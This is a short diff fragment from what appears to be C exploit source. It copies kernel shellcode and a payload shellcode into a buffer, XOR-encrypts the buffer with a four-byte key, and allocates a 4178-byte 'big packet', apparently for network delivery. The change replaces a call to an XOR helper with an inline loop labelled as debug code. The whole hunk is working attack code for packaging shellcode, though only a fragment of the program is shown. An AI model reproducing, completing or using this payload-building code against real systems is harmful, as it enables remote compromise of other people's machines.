@@ -335,8 +335,13 @@ int main(int argc, char* argv[])
 	//copy payload shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
 
+	//FOR DEBUG PURPOSES ONLY, will convert to a function later
 	//Xor the data buffer with the calculated key
-	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
+	for (i = 0; i < 4096; i++)
+	{
+		encrypted[i] ^= char_xor_key[i % 4];
+	}
+	//xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
 	//allocate memory for the big packet
 	unsigned char* big_packet = (unsigned char*)malloc(4178 + 1);
